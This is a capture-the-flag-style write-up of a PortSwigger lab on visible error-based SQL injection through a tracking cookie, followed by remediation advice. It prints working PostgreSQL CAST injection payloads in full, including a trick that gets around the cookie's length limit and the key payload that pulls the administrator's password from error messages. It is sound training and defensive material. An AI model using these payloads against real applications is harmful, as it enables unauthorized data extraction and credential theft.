## Goal: 
This lab contains a sql injection vulnerability. The application uses a tracking cookie for analytics and performs sql query containing the submitted cookie.

## Lab details
Lab: Visible error-based SQL injection

Level: Practitioner

Vulnerability Class: SQL Injection — Error-based

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based)

Date Completed: 04-Aug-2026

Time to Solve: 45 min

## Vulnerability Summary
The application embeds the value of the TrackingId cookie directly into a backend SQL query used for analytics, without sanitization or parameterization. The query's results are not rendered in the page, but the application returns the database's verbose error message when the injected input causes a type conversion failure. By crafting payloads that force the database to attempt casting a string value to an integer, the underlying value is disclosed directly in the error text. In a production application, this allows an unauthenticated attacker to extract arbitrary data, including credentials, and enumerate the database schema to support further, more targeted attacks.

## Reconnaissance
I began by sending a baseline request through Burp Suite Repeater to identify the injection point and confirm how the backend responds to malformed input.

1. Appending a single quote (') to the `{TrackingId}` cookie produced an unhandled error, indicating the value is passed to the SQL parser without sanitization.
2. The error response disclosed the full underlying SQL query, including my injected value — confirming this is a visible error-based injection rather than a blind one, since the database's error text itself is the exfiltration channel.
3. Appending a comment sequence (`--`) closed the string literal cleanly and restored a normal response, confirming I could control the query's syntax.
4. A generic `SELECT` subquery cast to `int` produced a distinct error indicating the injected condition needed to evaluate as a boolean — expected behavior for this backend (PostgreSQL).
5. Injecting a `SELECT username FROM users` subquery produced a truncated response, revealing a length limit on the cookie value that stripped my trailing comment.
6. Removing the original `{TrackingId}` value entirely freed enough characters to complete the payload, at which point the database's own error text returned the queried value directly.


## Exploitation — Step by Step
### Step 1: Confirm the injection point
payload in cookie: 
```text
{TRACKING_ID}'
```
probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '{TRACKING_ID}'
```
This produced an unhandled server error disclosing the full query and confirming the cookie value is concatenated into SQL without escaping.

### Step 2: Restore syntactic validity
 
Payload:
```text
{TRACKING_ID}'--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '{TRACKING_ID}'--
```
This returned a normal `200 OK` response, confirming that the injected comment sequence closed the string literal correctly and that I now controlled the trailing portion of the query.

### Step 3: Establish a boolean-safe injection point
 
Payload:
```text
{TRACKING_ID}' AND CAST((SELECT 1) AS int)--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '{TRACKING_ID}' AND CAST((SELECT 1) AS int)--
```
The database returned an error indicating that the argument of `AND` must evaluate to a boolean, not an integer. This confirmed the subquery executed successfully but needed to be wrapped in an equality comparison.
 
### Step 4: Satisfy the boolean requirement
 
Payload:
```text
{TRACKING_ID}' AND 1=CAST((SELECT 1) AS int)--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '{TRACKING_ID}' AND 1=CAST((SELECT 1) AS int)--
```
With the condition now syntactically valid, the response returned normally. This confirmed I could safely nest arbitrary subqueries inside the `CAST` expression to force type-conversion errors on demand.
 
### Step 5: Retrieve a value from the users table
 
Payload:
```text
{TRACKING_ID}' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '{TRACKING_ID}' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
The response showed a truncated query — my trailing `--` comment had been cut off due to a length limit on the cookie value, which reintroduced a syntax error. This indicated that the `TrackingId` field imposes a fixed character cap.
 
### Step 6: Bypass the length limit
 
To reclaim space, I removed the original tracking ID value from the cookie entirely, since it wasn't required for the injection to succeed.
 
Payload:
```text
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
The database returned: `ERROR: invalid input syntax for type integer: "administrator"`. The failed cast disclosed the queried value directly in the error message, confirming `administrator` as the first row in the `users` table.
 
### Step 7: Extract the administrator's password
 
Payload:
```text
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
The resulting error disclosed the administrator's password in plaintext within the error message, completing the data needed to authenticate as administrator.
 
### Key Payload
 
```text
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Reconstructed query:
```sql
SELECT data FROM analytics WHERE cookie = '' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Tools Used
Manual (Burp Suite Repeater)


## The Fix
The root cause is string concatenation of untrusted input (the `TrackingId` cookie) into a SQL statement. The primary remediation is a parameterized query on the analytics lookup itself:

Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```

Additional mitigations:

- **Generic error handling:** Never return raw database error messages to the client. This lab is only exploitable because the verbose error text leaks queried values directly — suppressing detailed errors client-side (logging them server-side instead) would independently have blocked this exact attack, even without fixing the query itself.
- **Least-privilege database account:** The application's database user should not have access to unrelated tables (e.g., `users`) from the analytics code path, and should never have `information_schema` visibility beyond what's required.
- **Input validation:** Whitelist the expected format of the tracking ID (e.g., fixed-length alphanumeric) so malformed values are rejected before reaching the query layer.
- **Secure credential storage:** Passwords should be hashed with a strong, salted algorithm (bcrypt or Argon2id) and verified in application code after retrieval — never compared directly within a SQL statement — so that even a successful injection does not yield usable plaintext credentials.
- **WAF rules:** Flag or block requests containing SQL metacharacters (`'`, `--`, `/*`) in parameters that are never expected to contain them, as a compensating control rather than a primary defense.


## What I Found Interesting / Unexpected
The most notable aspect of this lab is the exploitation economics of error-based injection compared to blind boolean- or time-based techniques. Because the database's own error message reflects the failed value verbatim, each successful cast failure discloses a complete value in a single request. Blind injection techniques, by contrast, require inferring data one character (or one bit) at a time across many requests. Same injection point, same underlying flaw — but the presence of a verbose error channel changes the attack from a scripted, request-heavy process into a handful of manual, targeted queries.
 
It was also useful to see the character-limit truncation as a genuine, if incidental, obstacle rather than a red herring: the fix (deleting the original cookie value to reclaim space) is a good reminder that these constraints are worth investigating rather than working around blindly.

## Real-World Relevance
TBD


## Connections to My Own Projects
TBD

## Takeaway
**For developers:** Treat every value that crosses a trust boundary — including cookies and other values that don't feel "user-facing" — as untrusted input, and use parameterized queries without exception. Never build SQL through string concatenation.
 
**For AppSec:** No single control should be relied on in isolation. The character limit on this cookie looked like a mitigating factor but was trivially bypassed. Durable defense comes from layering parameterized queries, generic error handling, least-privilege database accounts, and hashed credential storage — so that the failure of any one layer doesn't lead directly to compromise.